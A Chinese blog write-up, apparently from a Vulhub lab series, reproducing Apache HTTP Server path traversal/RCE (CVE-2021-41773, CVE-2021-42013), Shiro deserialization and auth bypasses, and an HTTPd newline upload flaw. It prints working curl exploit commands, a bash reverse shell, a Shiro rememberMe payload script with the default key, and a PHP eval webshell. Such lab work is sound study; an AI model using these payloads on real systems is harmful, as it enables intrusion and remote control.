<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apacheCopy codeLoadModule cgi_module modules/mod_cgi.so</span><br><span class="line"></span><br><span class="line">&lt;Directory &quot;/path/to/cgi/scripts&quot;&gt;</span><br><span class="line">    Options +ExecCGI</span><br><span class="line">    AddHandler cgi-script .cgi .pl</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure>

<p>在这个示例中，LoadModule行启用了 CGI 模块， 部分指定了 CGI 脚本所在的目录，并通过 Options +ExecCGI和AddHandler 配置来告诉 Apache 如何处理 CGI 脚本。 然后，你可以在指定的目录下编写 CGI 脚本（如 Perl、Python 等脚本），当客户端请求访问这些脚本时，Apache 会将请求传递给相应的 CGI 程序，然后将生成的响应返回给客户端。 这个漏洞的利用条件是版本等于2.4.49,如果需要打rce,则需要穿越的目录允许被访问，比如配置了Require all granted（默认情况下是不允许的）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在Apache HTTP Server（通常称为Apache）的配置中，Require all granted 是一个用于控制访问权限的配置指令。它用</span><br><span class="line">于声明对特定资源或路径的访问是允许的，即所有请求都被授予访问权限。</span><br><span class="line"></span><br><span class="line">具体来说，Require all granted 是在Apache的访问控制配置块（例如 &lt;Directory&gt; 或 &lt;Location&gt; 块）中使用的，用</span><br><span class="line">于指定所有用户都被授予对该目录或位置的访问权限。这意味着任何用户都可以访问这个目录或位置的内容，而不受进一步的</span><br><span class="line">访问控制限制。</span><br></pre></td></tr></table></figure>

<h3 id="复现-5"><a href="#复现-5" class="headerlink" title="复现"></a>复现</h3><p>这个环境就遇到一定的问题，我们直接在windows浏览器里访问不了</p>
<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/41773%E7%A0%B4%E8%A7%A3.png" class>

<p>我们回到虚拟机ping一下主机</p>
<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/41773%E7%A0%B4%E8%A7%A32.png" class>

<p>发现是可以ping通的</p>
<p>那我们尝试用nmap扫一下存活端口</p>
<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/41773%E7%A0%B4%E8%A7%A33.png" class>

<p>8080整了一个filtered，给拦截了</p>
<p>这里不想进容器改了，直接上poc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -v --path-as-is http://靶机IP和端口/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br><span class="line">curl -v --data &quot;echo;你要执行的命令&quot; &#x27;http://靶机IP和端口/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2021-42013（Apache-HTTP-Server路径穿越漏洞）"><a href="#CVE-2021-42013（Apache-HTTP-Server路径穿越漏洞）" class="headerlink" title="CVE-2021-42013（Apache HTTP Server路径穿越漏洞）"></a>CVE-2021-42013（Apache HTTP Server路径穿越漏洞）</h2><p>Apache官方在2.4.50版本中对2.4.49版本中出现的目录穿越漏洞CVE-2021-41773进行了修复，但这个修复并不完整</p>
<p>攻击者依旧可以读取Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，也可以在开启了cgi或者cgid的服务器上执行任意命令</p>
<p>漏洞利用条件是Apache HTTP Server2.4.49以及2.4.50两个版本</p>
<h3 id="复现-6"><a href="#复现-6" class="headerlink" title="复现"></a>复现</h3><img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/42013%E7%A0%B4%E8%A7%A3.png" class>

<p>可以看到这下子成功开启了页面服务</p>
<p>既然和41773这个CVE类似，我们就尝试一下41773的poc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v --path-as-is http://192.168.10.129:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br></pre></td></tr></table></figure>

<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/42013%E7%A0%B4%E8%A7%A32.png" class>

<p>发现失败了，但是我们上面说过42013对漏洞的修复并不完整，我们将%2e再次进行编码（%%32%65）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -v --path-as-is http://192.168.10.129:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/</span><br><span class="line">.%%32%65/.%%32%65/etc/passwd</span><br></pre></td></tr></table></figure>

<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/42013%E7%A0%B4%E8%A7%A33.png" class>

<p>可以看到读取成功，但是除了读取，还可以尝试进行rce，这里就不试41773的poc了，直接使用二次编码的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v --data &quot;echo;ls&quot; &#x27;http://192.168.10.129:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&#x27;</span><br></pre></td></tr></table></figure>

<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/42013%E7%A0%B4%E8%A7%A34.png" class>

<p>可以看到命令执行成功</p>
<p>那我们尝试一下反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8888</span><br><span class="line">curl -v --data &quot;echo;bash -i &gt;&amp; /dev/tcp/192.168.10.129/8888 0&gt;&amp;1&quot; &#x27;http://192.168.1.103:8080/cgi-</span><br><span class="line">bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&#x27;</span><br></pre></td></tr></table></figure>

<p>这样子直接反弹失败了，看了教程才想起可以将命令写入文件，然后再执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -v --data &quot;echo;echo &#x27;bash -i &gt;&amp; /dev/tcp/192.168.10.129/8888 0&gt;&amp;1&#x27;&gt;&gt; /tmp/shell.sh&quot; </span><br><span class="line">&#x27;http://192.168.10.129:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65</span><br><span class="line">/.%%32%65/.%%32%65/bin/sh&#x27;</span><br></pre></td></tr></table></figure>

<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/42013%E7%A0%B4%E8%A7%A35.png" class>

<p>然后再用cat读取文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -v --data &quot;echo;cat /tmp/shell.sh&quot; &#x27;http://192.168.10.129:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65</span><br><span class="line">/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&#x27;</span><br></pre></td></tr></table></figure>

<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/42013%E7%A0%B4%E8%A7%A36.png" class>

<p>可以看到文件内容写入成功，下一步就是执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -v --data &quot;echo;bash /tmp/shell.sh&quot; &#x27;http://192.168.10.129:8080/cgi-</span><br><span class="line">bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&#x27;</span><br></pre></td></tr></table></figure>

<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/42013%E7%A0%B4%E8%A7%A37.png" class>

<p>反弹shell成功，看来以后得试试写入文件执行来反弹shell</p>
<h2 id="CVE-2016-4437（Apache-shiro反序列化漏洞复现）"><a href="#CVE-2016-4437（Apache-shiro反序列化漏洞复现）" class="headerlink" title="CVE-2016-4437（Apache shiro反序列化漏洞复现）"></a>CVE-2016-4437（Apache shiro反序列化漏洞复现）</h2><p>Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。它独立于任何容器或框架,所以可以搭配别的组件使用,包括以下功能</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">身份验证（Authentication）：Shiro 可以处理用户身份验证，包括用户名/密码验证、多因素身份验证、记住我功能等。它</span><br><span class="line">支持灵活的身份验证方式，并提供了可插拔的身份验证机制，使开发人员能够适应各种身份验证需求。</span><br><span class="line"></span><br><span class="line">授权（Authorization）：Shiro 具有细粒度的授权机制，允许开发人员定义角色和权限，并在应用程序中对用户进行授权操</span><br><span class="line">作。通过简单的注解或编程方式，开发人员可以轻松地控制用户对资源的访问权限。</span><br><span class="line"></span><br><span class="line">会话管理（Session Management）：Shiro 管理用户会话，包括会话的创建、销毁、过期和检索等。它提供了灵活的会话存</span><br><span class="line">储机制，并支持集中式和分布式环境下的会话管理。</span><br><span class="line"></span><br><span class="line">密码加密（Cryptography）：Shiro 可以帮助开发人员安全地处理用户密码，提供了常用的加密算法和密码哈希功能。这有助</span><br><span class="line">于保护用户密码，并提供额外的安全性。</span><br><span class="line"></span><br><span class="line">Web 支持：Shiro 针对 Web 应用程序提供了特定的支持，包括集成框架（如 Apache Struts 和 Spring MVC）、基于过滤</span><br><span class="line">器的安全控制、Web 会话管理等。这使得在 Web 环境中使用 Shiro 更加方便和高效。</span><br></pre></td></tr></table></figure>

<p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会将用户信息加密，加密过程:用户信息&#x3D;&gt;序列化&#x3D;&gt;AES加密&#x3D;&gt;base64编码&#x3D;&gt;RememberMe Cookie值。如果用户勾选记住密码，那么在请求中会携带cookie，并且将加密信息存放在cookie的rememberMe字段里面，在服务端收到请求对rememberMe值，先base64解码然后AES解密再反序列化，这个加密过程如果我们知道AES加密的密钥，那么我们把用户信息替换成恶意命令，就导致了反序列化RCE漏洞。在shiro版本&lt;&#x3D;1.2.4中使用了默认密钥kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;，这就更容易触发RCE漏洞。</p>
<p>所以我们payload的产生过程是：</p>
<p>命令&#x3D;&gt;序列化&#x3D;&gt;AES加密&#x3D;&gt;base64编码&#x3D;&gt;RememberMe Cookie值</p>
<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>1.未登录的情况下，请求包的cookie中没有rememberMe字段，返回包set-Cookie里也没有deleteMe字段<br>2.登录失败的话，不管有没有勾选RememberMe字段，返回包都会有 rememberMe&#x3D; deleteMe 字段<br>3.不勾选RememberMe，登录成功的话，返回包set-Cookie里有rememberMe&#x3D;deleteMe字段。但是之后的所有请求中Cookie都不会有RememberMe字段<br>4.勾选RememberMe，登录成功的话，返回包set-Cookie里有rememberMe&#x3D;deleteMe字段，还会有remember 字段，之后的所有请求中Cookie都会有rememberMe字段<br>5.或者可以在cookie后面自己加一个rememberMe&#x3D;1,看返回包有没有rememberMe&#x3D; deleteMe</p>
<h3 id="复现-7"><a href="#复现-7" class="headerlink" title="复现"></a>复现</h3><img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/4437%E7%A0%B4%E8%A7%A3.png" class>

<h4 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h4><p>这里我们就使用专门针对java反序列化的工具：ysoserial</p>
<p>先进行下载</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</span><br></pre></td></tr></table></figure>

<p>这里还需要一段生成payload的代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"> </span><br><span class="line">def encode_rememberme():</span><br><span class="line">    f = open(&#x27;poc.ser&#x27;,&#x27;rb&#x27;)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(f.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"> </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    payload = encode_rememberme()   </span><br><span class="line">    print(&quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode()))</span><br></pre></td></tr></table></figure>

<p>使用ysoserial生成CommonsBeanutils1的Gadget：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-SNAPSHOT.jar CommonsBeanutils1 &quot;touch /tmp/liberator&quot; &gt; poc.ser</span><br></pre></td></tr></table></figure>

<p>Gadget 是指在 Java 序列化漏洞利用中使用的特定类或对象。攻击者可以构造特定的序列化数据，通过利用目标应用程序中的反序列化过程中的漏洞，触发 Gadget 的执行从而执行恶意代码。Gadget 通常是由一系列利用链构成的，其中一个 Gadget 可能依赖于另一个 Gadget 的执行结果。Gadget 的目的是利用目标系统中存在的弱点，例如不安全的反序列化实现，最终达到远程代码执行的目的。</p>
<p>CommonsBeanutils1是Apache Commons Beanutils 库的一个旧版本，其中存在一个已知的 Java 序列化漏洞。该漏洞可以被恶意利用来执行远程代码，可能导致远程代码执行漏洞（Remote Code Execution Vulnerability）</p>
<p>这个漏洞的本质就是1.2.4及以前版本的shiro的RememberMe功能存在rce可以执行反序列化漏洞,并且这个功能使用了具有反序列化漏洞的CommonsBeanutils1,可以使用CommonsBeanutils1的链子来触发反序列化攻击</p>
<p>然后再用python脚本生成payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 poc.py</span><br></pre></td></tr></table></figure>

<p>再将生成的payload填入抓到的请求包里就成功写入了</p>
<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/4437%E7%A0%B4%E8%A7%A32.png" class>

<h4 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h4><p>使用工具，工具地址：<a target="_blank" rel="noopener" href="https://github.com/j1anFen/shiro_attack">https://github.com/j1anFen/shiro_attack</a></p>
<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/4437%E7%A0%B4%E8%A7%A33.png" class>

<p>爆破出密钥</p>
<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/4437%E7%A0%B4%E8%A7%A34.png" class>

<p>再点击爆破利用链，得到链子为CommonsBeanutils1</p>
<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/4437%E7%A0%B4%E8%A7%A35.png" class>

<p>可进行命令执行</p>
<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/4437%E7%A0%B4%E8%A7%A36.png" class>

<p>这里执行内存码，执行之后用蚁剑进行连接，发现蚁剑连接的返回数据为空，这里就尝试使用冰蝎，因为冰蝎也是AES加密，执行流量加密之后难以被检测(这里发生一个小错误，内存马类型用什么连接就应该用什么内存马类型，下面就改成冰蝎了)</p>
<p>冰蝎地址：<a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder/releases/tag/Behinder_v3.0_Beta_11">https://github.com/rebeyond/Behinder/releases/tag/Behinder_v3.0_Beta_11</a></p>
<p>所以就使用冰蝎进行连接，右键新增输入shiro工具的url和密码，进行连接</p>
<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/4437%E7%A0%B4%E8%A7%A37.png" class>

<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/4437%E7%A0%B4%E8%A7%A38.png" class>

<p>好，shell连接成功</p>
<h2 id="CVE-2017-15715（Apache-HTTPd换行解析漏洞）"><a href="#CVE-2017-15715（Apache-HTTPd换行解析漏洞）" class="headerlink" title="CVE-2017-15715（Apache HTTPd换行解析漏洞）"></a>CVE-2017-15715（Apache HTTPd换行解析漏洞）</h2><ul>
<li>我们通常所说的Apache HTTP Server，通常指的是整个软件包，它包括了HTTP服务器的核心功能、模块化架构、配置文件、运行时环境等。Apache HTTP Server 提供了完整的 Web 服务器解决方案，可以用于托管和提供网站内容。</li>
<li>而 httpd 则是 Apache HTTP Server 的具体可执行程序的名称（通常在 Unix&#x2F;Linux 系统上）。通过运行 httpd守护进程，Apache HTTP Server 开始监听指定的端口（例如默认的80端口），接收来自客户端的HTTP请求，并根据配置文件进行相应的处理和响应。</li>
<li>httpd可以通过mod_php来运行PHP网页。其存在一个解析漏洞，在解析PHP时，如1.php0x0A将被按照1.php进行解析，导致绕过一些服务器的安全策略。</li>
<li>mod_php 是 Apache 的一个模块，它允许将 PHP 解释器嵌入到 Apache 的进程中，并通过该模块将 PHP 代码集成到 Apache 的请求处理流程中。当 Apache 收到一个包含 PHP 代码的网页请求时，mod_php 模块负责解析该请求，将 PHP 代码交给 PHP 解释器进行解释执行，然后将执行结果返回给客户端浏览器。</li>
</ul>
<p>除了mod_php之外，还存在其他方式来运行PHP网页，以下是一些常见的替代方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. PHP-FPM（PHP FastCGI Process Manager）：PHP-FPM 是一个独立的进程管理器，通过 FastCGI 协议与 Web 服务器</span><br><span class="line">（例如 Apache 或 Nginx）进行通信。PHP-FPM 可以独立于 Web 服务器运行，提供更高的性能和灵活性。</span><br><span class="line"></span><br><span class="line">2. CGI（Common Gateway Interface）：CGI 是一种标准的 Web 服务器和应用程序之间的接口协议。通过将 PHP 解释器</span><br><span class="line">作为 CGI 程序来运行 PHP 网页，Web 服务器可以通过 CGI 协议与 PHP 解释器进行通信并执行 PHP 代码。</span><br><span class="line"></span><br><span class="line">3. FastCGI：FastCGI 是一种改进的 CGI 协议，它使用长连接和进程池的方式提高了性能。类似于 CGI，FastCGI 可以将 </span><br><span class="line">PHP 解释器作为独立的进程来运行 PHP 网页，并通过协议与 Web 服务器进行通信。</span><br></pre></td></tr></table></figure>

<p>此漏洞利用条件为apache版本在2.4.0-2.4.29</p>
<h3 id="复现-8"><a href="#复现-8" class="headerlink" title="复现"></a>复现</h3><img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/15715%E7%A0%B4%E8%A7%A3.png" class>

<p>可以看到是一个文件上传界面，上传上去的文件会被改一个名字，我们随便上传一个木马文件，文件内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/15715%E7%A0%B4%E8%A7%A32.png" class>

<p>上传失败，将文件后缀改成双写php或者大小写交替都不行，那么就试试将文件后缀改为txt</p>
<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/15715%E7%A0%B4%E8%A7%A33.png" class>

<p>上传成功,说明过滤的是php后缀,根据这个漏洞,1.php0X0A(16进制的0X0A)和1.php具有相同效果,所以可以抓包在文件名后面插一个16进制 因为burpsuit的16进制</p>
<p>编辑器不能插入只能修改,所以提前在evil.php的后面加一个空格,然后把空格对应的0d改成0a就可以了</p>
<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/15715%E7%A0%B4%E8%A7%A34.png" class>

<p>然后连接shell</p>
<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/15715%E7%A0%B4%E8%A7%A35.png" class>

<p>shell连接成功</p>
<h2 id="CVE-2010-3863（Apache-Shiro认证绕过漏洞）"><a href="#CVE-2010-3863（Apache-Shiro认证绕过漏洞）" class="headerlink" title="CVE-2010-3863（Apache Shiro认证绕过漏洞）"></a>CVE-2010-3863（Apache Shiro认证绕过漏洞）</h2><p>由于CVE-2016-4437也是关于Apache Shiro的，所以这里就不再对于基础服务做介绍了</p>
<ul>
<li>Apache Shiro在使用Spring动态控制器时，攻击者通过构造..;这样的跳转，可以绕过Shiro中对目录的权限限制。</li>
<li>“Spring动态控制器”指的是基于 Spring 框架的控制器（Controller），它们负责处理 Web 请求并返回相应的响应。Spring MVC 是一个常见的 Web 应用程序框架，提供了一种声明式的方式来定义和处理控制器。</li>
<li>在用户访问路径的时候会经过以下步骤:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 用户发送请求。</span><br><span class="line">2. 请求到达路由，路由根据配置的规则将请求分派给相应的控制器。</span><br><span class="line">3. 控制器接收请求并处理业务逻辑。</span><br><span class="line">4. 控制器生成响应数据。</span><br><span class="line">5. 响应数据返回给用户。</span><br></pre></td></tr></table></figure>

<ul>
<li>路由也是在 Web 框架中实现的，但它是用来配置和管理请求的映射规则。路由定义了请求的路径和对应的处理器（可能是控制器），以便框架能够将请求分派给正确的处理程序。</li>
<li>路由确定了用户请求应该被传递给哪个控制器进行处理。路由的配置规则定义了请求的 URL 或路径与相应控制器之间的映射关系。通过路由配置，Web 框架能够将特定的请求路由到正确的控制器。</li>
<li>控制器负责接收用户请求并处理相关的业务逻辑。当用户发送请求时，路由将请求分派给相应的控制器，控制器根据请求的内容进行处理，并生成适当的响应数据。</li>
<li>控制器通常是在 Web 框架（如Spring MVC、Express.js等）中作为对象或类进行实现。控制器通过定义请求映射（Request Mapping）来监听特定的 URL 或路由，从而接收用户的请求。控制器可以包含多个方法，每个方法处理不同的请求。</li>
</ul>
<p>漏洞利用条件是Apache Shiro版本在1.1.0以前</p>
<h3 id="复现-9"><a href="#复现-9" class="headerlink" title="复现"></a>复现</h3><img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/3863%E7%A0%B4%E8%A7%A3.png" class>

<p>对于shrio有许多拦截器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">AuthenticationInterceptor：用于验证用户身份信息，确保用户已经通过身份验证。如果用户未通过身份验证，则该拦截器</span><br><span class="line">将重定向或返回错误响应。</span><br><span class="line"></span><br><span class="line">AuthorizationInterceptor：用于验证用户是否具有执行特定操作或访问资源所需的权限。如果用户没有足够的权限，则该</span><br><span class="line">拦截器可能会阻止用户访问受限资源或执行敏感操作。</span><br><span class="line"></span><br><span class="line">SessionValidationInterceptor：负责验证用户会话的有效性。它检查用户的会话是否过期或被篡改，并采取相应的措施，</span><br><span class="line">如重新验证用户身份或要求用户重新登录。</span><br><span class="line"></span><br><span class="line">LogoutInterceptor：用于处理用户登出操作。该拦截器可能会清除用户的会话信息、注销用户身份验证状态或执行其他与用</span><br><span class="line">户登出相关的操作。</span><br></pre></td></tr></table></figure>

<p>用户可以在Shiro.ini编写匹配URL配置，将会拦截匹配的URL，并执行响应的拦截器。从而实现对URL的访问控制，URL路径表达式通常为ANT格式。如下配置，访问 &#x2F;index.html主页的时候，Shiro将不会对其进行登录判断，anon拦截器不需要登录就能进行访问。而对于&#x2F;user&#x2F;xiaoming 等 &#x2F;user&#x2F;xiaogang等接口，authc拦截器将会对其进行登录判断，有登录认证才能访问资源。 </p>
<p>在最早的另一个漏洞中,*表示匹配零个或多个字符串，&#x2F;<em>可以匹配&#x2F;hello，但匹配不到&#x2F;hello&#x2F;因为</em>通配符无法匹配路径。 </p>
<p>如果我们给&#x2F;hello链接设置了拦截器，访问&#x2F;hello将会被进行权限判断，如果请求的URI为&#x2F;hello&#x2F;呢，&#x2F;*URL路径表达式将无法正确匹配，放行。然后进入到spring(Servlet)拦截器，spring中&#x2F;hello形式和&#x2F;hello&#x2F;形式的URL访问的资源是一样的。那么就实现了没有登录就越权访问了&#x2F;hello目录</p>
<p>直接请求管理页面&#x2F;admin&#x2F;，无法访问，将会被重定向到根目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: 192.168.10.129:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en;q=0.3,en-US;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>

<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/3863%E7%A0%B4%E8%A7%A32.png" class>

<p>构造恶意请求&#x2F;.&#x2F;admin，即可绕过权限校验，访问到管理页面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /./admin HTTP/1.1</span><br><span class="line">Host: 192.168.10.129:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en;q=0.3,en-US;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>

<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/3863%E7%A0%B4%E8%A7%A33.png" class>

<h2 id="CVE-2020-1957（Apache-Shiro认证绕过漏洞）"><a href="#CVE-2020-1957（Apache-Shiro认证绕过漏洞）" class="headerlink" title="CVE-2020-1957（Apache Shiro认证绕过漏洞）"></a>CVE-2020-1957（Apache Shiro认证绕过漏洞）</h2><p>还是shiro框架，就不对服务做介绍了</p>
<h3 id="复现-10"><a href="#复现-10" class="headerlink" title="复现"></a>复现</h3><p>先访问一下web页面</p>
<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/1957%E7%A0%B4%E8%A7%A3.png" class>

<p>在CVE-2010-3863中我们得知</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">用户可以在Shiro.ini编写匹配URL配置，将会拦截匹配的URL，并执行响应的拦截器。从而实现对URL的访问控制，URL路径表</span><br><span class="line">达式通常为ANT格式。如下配置，访问 /index.html主页的时候，Shiro将不会对其进行登录判断，anon拦截器不需要登录就</span><br><span class="line">能进行访问。而对于/user/xiaoming 等 /user/xiaogang等接口，authc拦截器将会对其进行登录判断，有登录认证才能访</span><br><span class="line">问资源。</span><br><span class="line"></span><br><span 